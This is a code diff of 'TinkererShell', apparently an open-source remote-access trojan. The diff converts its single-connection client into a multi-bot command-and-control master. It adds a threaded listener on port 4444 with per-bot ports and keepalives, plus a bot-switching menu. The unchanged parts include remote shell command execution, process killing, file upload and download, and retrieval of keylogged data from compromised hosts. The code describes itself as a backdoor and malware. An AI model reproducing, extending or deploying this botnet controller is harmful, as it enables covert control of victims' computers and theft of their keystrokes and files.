@@ -1,14 +1,17 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-"""TinkererShell client, a simple client to control bots.\n"""
+"""TinkererShell master, a simple bots manager.\n"""
 
 # Written By Ananke: https://github.com/4n4nk3
 from socket import *
+from sys import exit
 import os
 import time
 import base64
 import cmd
+import threading
 import datetime
+from random import randrange
 # pycrypto
 from Crypto.Cipher import AES
 
@@ -17,9 +20,88 @@ global conn
 global cipher
 global EncodeAES
 global DecodeAES
+global connected_sockets
+global active_bot
+
+connected_sockets = []
+active_bot = 1000
 
 
-# Logging function
+def connection_gate():
+    host = ''
+    port = 4444
+    # Socket definition
+    s = socket(AF_INET, SOCK_STREAM)
+    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+    s.bind((host, port))
+    logging(data_to_log='\nWelcome in TinkererShell!\nWritten By 4n4nk3: https://github.com/4n4nk3\n', printer=True)
+    logging(data_to_log=('Listening on 0.0.0.0:%s...' % str(port)), printer=True)
+
+    # Listening...
+    s.listen(10)
+    while True:
+        so = s
+        conn_gate, addr = so.accept()
+        lengthcrypt = conn_gate.recv(1024)
+        expected_length = int(DecodeAES(cipher, lengthcrypt))
+        encrypted_received_data: str = ''
+        while len(encrypted_received_data) < expected_length:
+            encrypted_received_data += conn_gate.recv(1024).decode('utf-8')
+        clear_text = DecodeAES(cipher, encrypted_received_data)
+        logging(data_to_log=('Connection established with: ' + str(addr).split('\'')[1]), printer=True)
+        while True:
+            new_port = randrange(5000, 6000)
+            try:
+                new_so = socket(AF_INET, SOCK_STREAM)
+                new_so.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+                new_so.bind((host, new_port))
+                encrypted = EncodeAES(cipher, str(new_port))
+                # Send encrypted data's length encrypted
+                conn_gate.send(EncodeAES(cipher, str(len(encrypted))))
+                # Sleep 1 second to let the receiver decrypt the length packet.
+                time.sleep(1)
+                # Send encrypted data
+                conn_gate.send(encrypted)
+                threading.Thread(target=handler, args=(new_so, new_port, clear_text)).start()
+                break
+            except os.error as exception_gate:
+                if exception_gate.errno == 98:
+                    print("Port is already in use")
+                else:
+                    print(exception_gate)
+
+
+def handler(new_so, new_port, username):
+    global connected_sockets
+    global active_bot
+    new_so.listen(10)
+    conn_handler, addr = new_so.accept()
+    lengthcrypt = conn_handler.recv(1024)
+    expected_length = int(DecodeAES(cipher, lengthcrypt))
+    encrypted_received_data: str = ''
+    while len(encrypted_received_data) < expected_length:
+        encrypted_received_data += conn_handler.recv(1024).decode('utf-8')
+    a = DecodeAES(cipher, encrypted_received_data)
+    if a == username:
+        logging(data_to_log=('Connection consolidated with: {}\t{}'.format(str(addr).split('\'')[1], username)),
+                printer=True)
+        connected_sockets.append(
+            {'conn': conn_handler, 'port': new_port, 'ip': str(addr).split('\'')[1], 'username': username,
+             'status': True})
+        position = len(connected_sockets) - 1
+        while True:
+            if position != active_bot:
+                encrypted = EncodeAES(cipher, 'KeepAlive')
+                # Send encrypted data's length encrypted
+                conn_handler.send(EncodeAES(cipher, str(len(encrypted))))
+                # Sleep 1 second to let the receiver decrypt the length packet.
+                time.sleep(1)
+                # Send encrypted data
+                conn_handler.send(encrypted)
+            time.sleep(60)
+    conn_handler.close()
+
+
 def logging(data_to_log: str, printer=False) -> bool:
     """Log data passed as argument and if needed print it also to the console.\n"""
     if printer is True:
@@ -28,8 +110,8 @@ def logging(data_to_log: str, printer=False) -> bool:
         log_descriptor = open('sessionlog.txt', 'a')
         log_descriptor.write('\n' + datetime.datetime.now().strftime("%Y-%m-%d %H:%M") + '\n' + data_to_log)
         log_descriptor.close()
-    except Exception as exception:
-        print(exception)
+    except Exception as exception_logging:
+        print(exception_logging)
     return True
 
 
@@ -84,7 +166,7 @@ def downloader() -> bool:
     ask_input(send=True)
     received_file_data = receiver()
     # Local filename to save downloaded file
-    local_filename = ask_input(phrase='Insert name wich you want to use to save the file\t\texample.txt\n\n >>> ')
+    local_filename = ask_input(phrase='Insert name which you want to use to save the file\t\texample.txt\n\n >>> ')
     # sender(a)
     if received_file_data != 'reachedexcept':
         try:
@@ -92,8 +174,8 @@ def downloader() -> bool:
             downloaded_file_descriptor.write(bytes(received_file_data))
             downloaded_file_descriptor.close()
             logging(data_to_log=('File saved in ' + os.getcwd() + '\n'), printer=True)
-        except Exception as exception:
-            logging(data_to_log=str(exception), printer=True)
+        except Exception as exception_downloader:
+            logging(data_to_log=str(exception_downloader), printer=True)
     else:
         remote_exception = receiver()
         logging(
@@ -107,13 +189,13 @@ def uploader() -> bool:
     sender('SHupload')
     file_to_upload = ask_input(phrase=('Insert the name of the file that you want to upload\t\t' + os.path.normcase(
         'C:/boot.ini') + '\n\n >>> '))
-    ask_input(phrase='Insert name wich you want to use to save the file\t\tC:\\boot.ini\n\n >>> ', send=True)
+    ask_input(phrase='Insert name which you want to use to save the file\t\tC:\\boot.ini\n\n >>> ', send=True)
     try:
         upload_descriptor = open(file_to_upload, 'rb')
         file_data = upload_descriptor.read()
         upload_descriptor.close()
-    except Exception as exception:
-        logging(data_to_log=str(exception), printer=True)
+    except Exception as exception_uploader:
+        logging(data_to_log=str(exception_uploader), printer=True)
         file_data = 'reachedexcept'
     sender(file_data)
     receiver(printer=True)
@@ -149,9 +231,9 @@ def keylogdownloader():
             keylogged_descriptor = open('keylogged.txt', 'a')
             keylogged_descriptor.write(keylogged_data)
             keylogged_descriptor.close()
-            logging(data_to_log='Download compleated!\n Use <SHkeylog show> to see keylogged data\n', printer=True)
-        except Exception as exception:
-            logging(data_to_log=str(exception), printer=True)
+            logging(data_to_log='Download completed!\n Use <SHkeylog show> to see keylogged data\n', printer=True)
+        except Exception as exception_keylogdownloader:
+            logging(data_to_log=str(exception_keylogdownloader), printer=True)
 
 
 def keylogshower():
@@ -160,42 +242,116 @@ def keylogshower():
         keylogged_descriptor = open('keylogged.txt', 'r')
         print(keylogged_descriptor.read())
         keylogged_descriptor.close()
-    except Exception as exception:
-        logging(data_to_log=str(exception), printer=True)
+    except Exception as exception_keylogshower:
+        logging(data_to_log=str(exception_keylogshower), printer=True)
 
 
 def quit_utility() -> bool:
-    """Quit and terminate remote backdoor thread. If mailactivation thread is not running the malware gonna kill himself.\n"""
+    """Quit and terminate remote backdoor thread. If mailactivation thread is not running the bot gonna kill himself.\n"""
+    global conn
     double_check = ask_input(phrase='Are you sure? yes/no\n')
     if double_check == 'yes':
-        sender('SHquit')
-        response = receiver()
-        if response == 'mistochiudendo':
-            return True
-        else:
-            logging(data_to_log=response, printer=True)
-            return False
+        for bot in connected_sockets:
+            conn = bot['conn']
+            sender('SHquit')
+            response = receiver()
+            if response == 'mistochiudendo':
+                return True
+            else:
+                logging(data_to_log=response, printer=True)
+                return False
     else:
         logging(data_to_log='Operation aborted\n', printer=True)
         return False
 
 
 def command_executer():
-    CommandExecuterInput().cmdloop()
+    CommandExecutorInput().cmdloop()
+
+
+def tinkerer_menu():
+    TinkererShellInput().cmdloop()
 
 
 # =================================================================================================
 
-class CommandExecuterInput(cmd.Cmd):
-    """Command Executer Input handler.\n"""
+class BotSwitcher(cmd.Cmd):
+    """Bots selection handler.\n"""
+    global active_bot
+    global conn
+    global connected_sockets
+    prompt = '\n(SHbots) '
+
+    # ---------------------------------------------------------------------------------------------
+    def do_SHbots(self, option):
+        """SHbots\n\tList connected bots.\n"""
+        printable_bots = 'Listing bots...'
+        for bots_counter in range(len(connected_sockets)):
+            if connected_sockets[bots_counter]['status'] is True:
+                printable_bots += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, connected_sockets[bots_counter]['ip'],
+                                                                  connected_sockets[bots_counter]['username'])
+        logging(data_to_log=printable_bots, printer=True)
+
+    # ---------------------------------------------------------------------------------------------
+    def default(self, command):
+        global active_bot
+        global conn
+        global connected_sockets
+        if command.isdigit() is True:
+            try:
+                if connected_sockets[int(command)]['status'] is True:
+                    double_check = ask_input(phrase='Are you sure? yes/no\n')
+                    if double_check == 'yes':
+                        active_bot = int(command)
+                        conn = connected_sockets[int(command)]['conn']
+                        tinkerer_menu()
+                    else:
+                        logging(data_to_log='Selection canceled\n', printer=True)
+            except Exception as exception_default:
+                if str(exception_default) == 'list index out of range':
+                    logging(data_to_log='The selected bot does not exist\n', printer=True)
+                else:
+                    logging(data_to_log=str(exception_default), printer=True)
+            else:
+                pass
+        else:
+            pass
+
+    # ---------------------------------------------------------------------------------------------
+    def do_SHquit(self, option) -> bool:
+        """SHquit\n\tQuit and close the connection\n"""
+        if quit_utility() is True:
+            return True
+        else:
+            return False
+
+    def emptyline(self):
+        pass
+
+    # =============================================================================================
+    def precmd(self, line):
+        logging(data_to_log=('\n(Bots) ' + line))
+        return cmd.Cmd.precmd(self, line)
+
+    # =============================================================================================
+    def postloop(self):
+        logging(data_to_log='\nQuitting!', printer=True)
+
+
+# =================================================================================================
+
+class CommandExecutorInput(cmd.Cmd):
+    """Command Executor Input handler.\n"""
 
     prompt = '\n  >>> '
 
+    # ---------------------------------------------------------------------------------------------
     def do_SHreturn(self, option):
         """SHreturn\n\tReturn to TinkererShell interactive mode.\n"""
         logging(data_to_log='Returning to TinkererShell interactive mode...\n', printer=True)
         return True
 
+    # ---------------------------------------------------------------------------------------------
     def default(self, command):
         sender(command)
         response = receiver()
@@ -216,6 +372,7 @@ class TinkererShellInput(cmd.Cmd):
 
     prompt = '\n(SHCmd) '
 
+    # ---------------------------------------------------------------------------------------------
     def do_SHprocess(self, option):
         """SHprocesses [option]\n\tlist: List active processes\n\tkill: Kill an active process\n"""
         if option:
@@ -296,13 +453,12 @@ class TinkererShellInput(cmd.Cmd):
             print('Aborted: unknown option\n')
 
     # ---------------------------------------------------------------------------------------------
-    def do_SHquit(self, option) -> bool:
-        """SHquit\n\tQuit and close the connection\n"""
-        if quit_utility() is True:
-            return True
-        else:
-            return False
+    def do_SHreturn(self, option):
+        """SHreturn\n\tReturn to TinkererShell bot selection mode.\n"""
+        logging(data_to_log='Returning to TinkererShell bot selection mode...\n', printer=True)
+        return True
 
+    # ---------------------------------------------------------------------------------------------
     def emptyline(self):
         pass
 
@@ -310,12 +466,6 @@ class TinkererShellInput(cmd.Cmd):
     def precmd(self, line):
         logging(data_to_log=('\n(Cmd) ' + line))
         return cmd.Cmd.precmd(self, line)
-
-    # =============================================================================================
-    def postloop(self):
-        # Chiudo il socket
-        conn.close()
-        logging(data_to_log='\nDisconnected!', printer=True)
 
 
 # =============================================================================================#=============================================================================================
@@ -336,24 +486,6 @@ if __name__ == '__main__':
     except Exception as exception:
         print(exception)
 
-    # Interface and port
-    HOST = ''
-    PORT = 4444
-
-    # Socket definition
-    s = socket(AF_INET, SOCK_STREAM)
-    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
-    s.bind((HOST, PORT))
-    logging(data_to_log='\nWelcome in TinkererShell!\nWritten By Tinkerer: https://github.com/4n4nk3\n', printer=True)
-    logging(data_to_log=('Listening on 0.0.0.0:%s...' % str(PORT)), printer=True)
-
-    # Listening...
-    s.listen(10)
-    conn, addr = s.accept()
-    a = conn.recv(1024).decode('utf-8')
-    logging(data_to_log=('Connection estabilished with: ' + str(addr)), printer=True)
-    logging(data_to_log=a, printer=True)
-
     # Cryptography
     BLOCK_SIZE = 32
     PADDING = '{'
@@ -364,9 +496,11 @@ if __name__ == '__main__':
     secret = '4n4nk353hlli5w311d0n3andI1ik3it!'
     cipher = AES.new(secret)
     del secret
-    decryptato = ''
 
+    threading.Thread(target=connection_gate).start()
+
+    time.sleep(5)
     # Start command loop
-    TinkererShellInput().cmdloop()
+    BotSwitcher().cmdloop()
 
-# TODO: Add support for multiple bots
+# TODO: Kill all reamining threads when user quit
